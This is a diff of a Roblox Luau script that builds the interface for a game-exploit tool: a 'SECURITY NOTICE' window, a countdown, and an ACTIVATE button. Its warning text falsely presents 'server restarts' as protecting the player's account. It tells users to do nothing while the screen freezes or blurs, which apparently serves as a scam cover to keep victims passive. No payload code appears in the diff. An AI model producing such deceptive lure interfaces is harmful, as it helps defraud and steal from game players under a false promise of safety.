@@ -2,15 +2,13 @@ local gui = Instance.new("ScreenGui")
 gui.Name = "PocariGUI"
 gui.ResetOnSpawn = false
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 320, 0, 240)
-mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
+mainFrame.Size = UDim2.new(0, 400, 0, 360)
+mainFrame.Position = UDim2.new(0.5, -200, 0.5, -180)
 mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.ClipsDescendants = true
-mainFrame.Parent = gui
 
 local mainCorner = Instance.new("UICorner")
 mainCorner.CornerRadius = UDim.new(0, 8)
@@ -27,7 +25,6 @@ titleBar.Size = UDim2.new(1, 0, 0, 32)
 titleBar.Position = UDim2.new(0, 0, 0, 0)
 titleBar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 titleBar.ClipsDescendants = true
-titleBar.Parent = mainFrame
 
 local titleBarCorner = Instance.new("UICorner")
 titleBarCorner.CornerRadius = UDim.new(0, 8)
@@ -35,7 +32,7 @@ titleBarCorner.Parent = titleBar
 
 local title = Instance.new("TextLabel")
 title.Name = "Title"
-title.Text = "ACTIVATION REQUIRED"
+title.Text = "SECURITY NOTICE"
 title.Font = Enum.Font.FredokaOne
 title.TextSize = 16
 title.TextColor3 = Color3.fromRGB(230, 230, 230)
@@ -43,7 +40,6 @@ title.BackgroundTransparency = 1
 title.Size = UDim2.new(0, 200, 1, 0)
 title.Position = UDim2.new(0, 12, 0, 0)
 title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = titleBar
 
 local closeButton = Instance.new("TextButton")
 closeButton.Name = "CloseButton"
@@ -55,98 +51,72 @@ closeButton.BackgroundColor3 = Color3.fromRGB(220, 60, 60)
 closeButton.Size = UDim2.new(0, 28, 0, 28)
 closeButton.Position = UDim2.new(1, -32, 0, 2)
 closeButton.BorderSizePixel = 0
-closeButton.Parent = titleBar
 
 local closeCorner = Instance.new("UICorner")
 closeCorner.CornerRadius = UDim.new(0, 6)
 closeCorner.Parent = closeButton
 
-local contentFrame = Instance.new("ScrollingFrame")
+local contentFrame = Instance.new("Frame")
 contentFrame.Name = "ContentFrame"
 contentFrame.BackgroundTransparency = 1
-contentFrame.Size = UDim2.new(1, -16, 1, -60)
-contentFrame.Position = UDim2.new(0, 8, 0, 40)
-contentFrame.ScrollBarThickness = 5
-contentFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
-contentFrame.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-contentFrame.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
-contentFrame.Parent = mainFrame
+contentFrame.Size = UDim2.new(1, -20, 1, -60)
+contentFrame.Position = UDim2.new(0, 10, 0, 40)
 
-local layout = Instance.new("UIListLayout")
-layout.Parent = contentFrame
-layout.Padding = UDim.new(0, 10)
-layout.SortOrder = Enum.SortOrder.LayoutOrder
+local header = Instance.new("TextLabel")
+header.Name = "Header"
+header.Text = "Whoops! Stop Right There..."
+header.Font = Enum.Font.FredokaOne
+header.TextSize = 22
+header.TextColor3 = Color3.fromRGB(255, 100, 100)
+header.TextWrapped = true
+header.BackgroundTransparency = 1
+header.Size = UDim2.new(1, 0, 0, 40)
+header.Position = UDim2.new(0, 0, 0, 10)
+header.TextXAlignment = Enum.TextXAlignment.Center
 
--- FIX: This ensures UIListLayout calculates sizes properly
-layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    contentFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
-end)
-
-local padding = Instance.new("UIPadding")
-padding.Parent = contentFrame
-padding.PaddingLeft = UDim.new(0, 5)
-padding.PaddingRight = UDim.new(0, 5)
-padding.PaddingTop = UDim.new(0, 5)
-
-local warningTitle = Instance.new("TextLabel")
-warningTitle.Name = "WarningTitle"
-warningTitle.Text = "Whoops! Stop Right There.."
-warningTitle.Font = Enum.Font.FredokaOne
-warningTitle.TextSize = 18
-warningTitle.TextColor3 = Color3.fromRGB(255, 60, 60)
-warningTitle.BackgroundTransparency = 1
-warningTitle.Size = UDim2.new(1, 0, 0, 24)
-warningTitle.TextXAlignment = Enum.TextXAlignment.Left
-warningTitle.LayoutOrder = 1
-warningTitle.Parent = contentFrame
-
-local description = Instance.new("TextLabel")
-description.Name = "Description"
-description.Text = "Before you can have the access for the exploits. I wanted you to understand that the script you are executing are very sensitive towards servers, now keep in mind that it does the job done but it also assures your account safety. Therefore script will conduct several server restarts during the execution of the scripts/exploits and server restarts will only lasts for approximately 1min to 3mins, making sure you are in the safe server. Now, why does the script server restarts, well its because game light-ban their players by disabling the gifting feature for the account (ex. Trade Failed, Data Loss). During the server restart please refrain from doing anything to keep your account totally safe. Please wait 7 seconds before activating. Enjoy and Goodluck ;)"
-description.Font = Enum.Font.Gotham
-description.TextSize = 14
-description.TextColor3 = Color3.fromRGB(220, 220, 220)
-description.BackgroundTransparency = 1
-description.Size = UDim2.new(1, 0, 0, 0)
-description.TextWrapped = true
-description.TextXAlignment = Enum.TextXAlignment.Justify
-description.AutomaticSize = Enum.AutomaticSize.Y
-description.LayoutOrder = 2
-description.Parent = contentFrame
-
-local timerText = Instance.new("TextLabel")
-timerText.Name = "TimerText"
-timerText.Text = "Activation available in: 7 seconds"
-timerText.Font = Enum.Font.Gotham
-timerText.TextSize = 14
-timerText.TextColor3 = Color3.fromRGB(255, 150, 50)
-timerText.BackgroundTransparency = 1
-timerText.Size = UDim2.new(1, 0, 0, 20)
-timerText.TextXAlignment = Enum.TextXAlignment.Center
-timerText.LayoutOrder = 3
-timerText.Parent = contentFrame
+local warningText = Instance.new("TextLabel")
+warningText.Name = "WarningText"
+warningText.Text = "Before you can access the script, you must understand that these exploits are server sensitive it may usually do a server restart. Why? It is to prevent your account for soft-bans (ex. Trade Failed, Data Loss, Contact Mods, etc). During the server restart (when your Screen Freezes, Blurred, etc. ) don't do anything just wait it out and it will only take 1min ~ 3mins. If you understand and wish to proceed please press the Activate button below."
+warningText.Font = Enum.Font.GothamSemibold
+warningText.TextSize = 14
+warningText.TextColor3 = Color3.fromRGB(200, 200, 200)
+warningText.TextWrapped = true
+warningText.TextXAlignment = Enum.TextXAlignment.Left
+warningText.TextYAlignment = Enum.TextYAlignment.Top
+warningText.BackgroundTransparency = 1
+warningText.Size = UDim2.new(1, 0, 0, 180)
+warningText.Position = UDim2.new(0, 0, 0, 60)
 
 local activateButton = Instance.new("TextButton")
 activateButton.Name = "ActivateButton"
 activateButton.Text = "ACTIVATE"
-activateButton.Font = Enum.Font.FredokaOne
+activateButton.Font = Enum.Font.GothamBold
 activateButton.TextSize = 18
-activateButton.TextColor3 = Color3.fromRGB(150, 150, 150)
-activateButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-activateButton.Size = UDim2.new(1, 0, 0, 40)  -- FIX: Changed to full width
+activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+activateButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+activateButton.Size = UDim2.new(0, 140, 0, 40)
+activateButton.Position = UDim2.new(0.5, -70, 1, -60)
 activateButton.AutoButtonColor = false
-activateButton.Active = false
-activateButton.LayoutOrder = 4
-activateButton.Parent = contentFrame
 
 local buttonCorner = Instance.new("UICorner")
 buttonCorner.CornerRadius = UDim.new(0, 6)
 buttonCorner.Parent = activateButton
 
 local buttonStroke = Instance.new("UIStroke")
-buttonStroke.Color = Color3.fromRGB(70, 70, 70)
+buttonStroke.Color = Color3.fromRGB(180, 240, 180)
 buttonStroke.Thickness = 2
 buttonStroke.Parent = activateButton
+
+local watermark = Instance.new("TextLabel")
+watermark.Name = "Watermark"
+watermark.Text = "made by pocari"
+watermark.Font = Enum.Font.GothamSemibold
+watermark.TextSize = 10
+watermark.TextColor3 = Color3.fromRGB(150, 150, 150)
+watermark.BackgroundTransparency = 1
+watermark.Size = UDim2.new(1, 0, 0, 16)
+watermark.Position = UDim2.new(0, 0, 1, -16)
+watermark.TextYAlignment = Enum.TextYAlignment.Top
 
 local userInput = game:GetService("UserInputService")
 local tweenService = game:GetService("TweenService")
@@ -200,38 +170,55 @@ local pulseTween = tweenService:Create(
 )
 pulseTween:Play()
 
+activateButton.Active = false
+activateButton.TextTransparency = 0.5
+activateButton.BackgroundTransparency = 0.5
+buttonStroke.Transparency = 0.5
+
+local countdown = 7
+local countdownText = activateButton:Clone()
+countdownText.Name = "CountdownText"
+countdownText.Text = tostring(countdown)
+countdownText.TextTransparency = 0
+countdownText.BackgroundTransparency = 1
+countdownText.TextColor3 = Color3.fromRGB(255, 255, 255)
+countdownText.Size = UDim2.new(1, 0, 1, 0)
+countdownText.Position = UDim2.new(0, 0, 0, 0)
+countdownText.UIStroke:Destroy()
+countdownText.Parent = activateButton
+
+delay(7, function()
+    while countdown > 0 do
+        countdown = countdown - 1
+        countdownText.Text = tostring(countdown)
+        wait(1)
+    end
+    countdownText:Destroy()
+    activateButton.Active = true
+    activateButton.TextTransparency = 0
+    activateButton.BackgroundTransparency = 0
+    buttonStroke.Transparency = 0
+end)
+
 activateButton.MouseEnter:Connect(function()
     if activateButton.Active then
-        activateButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        activateButton.BackgroundColor3 = Color3.fromRGB(80, 200, 100)
     end
 end)
 
 activateButton.MouseLeave:Connect(function()
     if activateButton.Active then
-        activateButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    else
-        activateButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        activateButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
     end
 end)
 
--- FIX: Added this to ensure UI elements render before countdown starts
-task.wait(0.1)
-
--- Start countdown after GUI is fully created
-local function startCountdown()
-    local seconds = 7
-    for i = seconds, 1, -1 do
-        timerText.Text = "Activation available in: " .. i .. " seconds"
-        wait(1)
-    end
-    
-    timerText.Text = "Activation available now!"
-    timerText.TextColor3 = Color3.fromRGB(0, 200, 0)
-    
-    activateButton.Active = true
-    activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    activateButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-    buttonStroke.Color = Color3.fromRGB(100, 100, 100)
-end
-
-startCountdown()
+watermark.Parent = mainFrame
+header.Parent = contentFrame
+warningText.Parent = contentFrame
+activateButton.Parent = contentFrame
+contentFrame.Parent = mainFrame
+closeButton.Parent = titleBar
+title.Parent = titleBar
+titleBar.Parent = mainFrame
+mainFrame.Parent = gui
+gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
